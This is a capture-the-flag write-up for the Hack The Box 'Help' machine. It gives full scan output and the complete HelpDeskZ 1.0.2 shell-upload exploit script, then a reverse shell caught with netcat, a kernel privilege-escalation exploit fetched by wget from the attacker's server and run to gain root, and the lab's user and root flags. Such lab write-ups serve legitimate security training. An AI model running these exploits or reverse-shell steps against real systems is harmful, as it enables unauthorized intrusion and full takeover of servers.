Help IP:10.10.10.121

rustscan:

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack


nmap:

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5bb4d9cdeaf6bbfba8c227ad8d74328 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5b010507486a39fc5536f3b4a246119 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e21b88d37621d41e38154a8111b79907 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel


gobuster:

gobuster dir -u http://help.htb -w /usr/share/wordlists/dirb/common.txt  -t 64
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://help.htb
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/03 17:32:15 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 292]
/index.html           (Status: 200) [Size: 11321]
/javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
/server-status        (Status: 403) [Size: 296]
/support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
Progress: 4328 / 4615 (93.78%)
===============================================================
2023/05/03 17:32:20 Finished
===============================================================


Visiting the site on port 80 /support we are presented with HelpDeskz page. We can try to search for an exploit:

└─$ searchsploit helpdeskz
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                                                                                                    | php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                                                                                                             | php/webapps/41200.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

We need to use the first exploit; however we need to add () to all print statements, and also we need to add one more line: plaintext = plaintext.encode('utf-8')

the entire code looks like this:

#!/usr/bin/python
import hashlib
import time
import sys
import requests
import datetime

print ('Helpdeskz v1.0.2 - Unauthenticated shell upload exploit')

if len(sys.argv) < 3:
    print ("Usage {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0]))
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
currentTime = int((datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    plaintext = plaintext.encode('utf-8')
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print ('found!')
        print (url)
        sys.exit(0)

print ('Sorry, I did not find anything')


Next, we need to prepare a php reverse shell, and add it as an attachment to a ticket.

In one terminal we prepare the python script with the according syntax and in another terminal window, we prepare a netcat listener. Once we upload the php reverse shell in the ticket, we need to run the python scrip immediately. After this ,we will be prompted with an url, that upon accessing, we will receive a reverse shell.



┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Help]
└─$ python 40300.py http://help.htb/support/uploads/tickets/ shell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
found!
http://help.htb/support/uploads/tickets/e621a5da7fea29e8336e1d5364873c4c.php


nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.121] 42370
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 00:51:35 up 19 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
help@help:/$ pwd
pwd
/
help@help:/$ ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
help@help:/$ cd home
cd home
help@help:/home$ ls
ls
help
help@help:/home$ cd help
cd help
help@help:/home/help$ ls
ls
help  npm-debug.log  user.txt
help@help:/home/help$ cat user.txt
cat user.txt
3d3e3d8eed7793297f14c5497891f92f
help@help:/home/help$ 




user flag:3d3e3d8eed7793297f14c5497891f92f



Privilge escalation:
help@help:/home/help$ uname -a
uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux


this means kernel exploit
 searchsploit linux 4.4.0-116
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------


Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                                                     | linux/local/44298.c



we mirror the exploit in our folder, and then we start a python https server in order to copy it to the victim machine:

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Help]
└─$ python -m SimpleHTTPServer 8080
/usr/bin/python: No module named SimpleHTTPServer

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Help]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.10.121 - - [05/May/2023 11:01:34] "GET /44298.c HTTP/1.1" 200 -

On the victim machine we move to tmp folder in order to compile the exploit.

cd /tmp
help@help:/tmp$ ls
ls
VMwareDnD
systemd-private-08fd3a50c2964d27bd7508b7f8630080-systemd-timesyncd.service-rahdFO
vmware-root
help@help:/tmp$ wget http://10.10.14.12:8080/44298.c
wget http://10.10.14.12:8080/44298.c
--2023-05-05 01:01:32--  http://10.10.14.12:8080/44298.c
Connecting to 10.10.14.12:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5773 (5.6K) [text/x-csrc]
Saving to: '44298.c'

44298.c             100%[===================>]   5.64K  --.-KB/s    in 0.03s   

2023-05-05 01:01:32 (201 KB/s) - '44298.c' saved [5773/5773]

help@help:/tmp$ ls
ls
44298.c
VMwareDnD
systemd-private-08fd3a50c2964d27bd7508b7f8630080-systemd-timesyncd.service-rahdFO
vmware-root
help@help:/tmp$ gcc -o 44298.c  
gcc -o 44298.c
gcc: fatal error: no input files
compilation terminated.
help@help:/tmp$ gcc -o a 44298.c
gcc -o a 44298.c
help@help:/tmp$ ./a
./a
task_struct = ffff880037488000
uidptr = ffff88003966c9c4
spawning root shell
root@help:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
root@help:/tmp# cat /root/root.txt
cat /root/root.txt
aa695c8acd6310a20d2836acfaa45ec8
root@help:/tmp# 

root flag:aa695c8acd6310a20d2836acfaa45ec8

